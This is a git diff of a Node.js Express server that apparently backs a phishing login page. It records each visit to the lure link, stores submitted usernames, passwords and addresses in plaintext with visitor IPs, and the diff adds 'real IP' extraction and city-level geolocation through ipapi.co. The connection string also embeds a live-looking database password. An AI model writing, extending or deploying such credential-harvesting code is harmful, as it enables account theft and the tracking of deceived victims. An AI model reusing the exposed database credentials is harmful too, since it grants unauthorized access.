@@ -5,12 +5,12 @@ const { Pool } = require('pg');
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
-
 // Supabase Connection
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
+
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -18,9 +18,28 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     password TEXT,
     address TEXT,
     ip TEXT,
+    location TEXT,
     timestamp TEXT
 )`);
 
+function getRealIP(req) {
+    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+           req.headers['x-real-ip'] ||
+           req.ip ||
+           'Unknown';
+}
+
+async function getLocation(ip) {
+    if (!ip || ip === 'Unknown') return 'Unknown';
+    try {
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await res.json();
+        if (data && data.country_name) {
+            return `${data.city || ''}, ${data.region || ''}, ${data.country_name}`.trim();
+        }
+    } catch (e) {}
+    return 'Unknown Location';
+}
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     pool.query(
@@ -30,23 +49,23 @@ function saveRecord(type, username = null, password = null, address = null, ip =
     console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 }
 
-// Record every click on main link
+// Record Page Visit Immediately
 app.get('/', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     saveRecord('Page Visit', null, null, null, ip);
-    console.log("🔴 MAIN LINK CLICKED!");
+    console.log("🔴 MAIN LINK CLICKED! Real IP:", ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     saveRecord('Page Visit', null, null, null, ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 app.post('/api/login', (req, res) => {
     const { username, password, address } = req.body;
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     saveRecord('Login Attempt', username, password, address, ip);
     res.json({ success: true });
 });
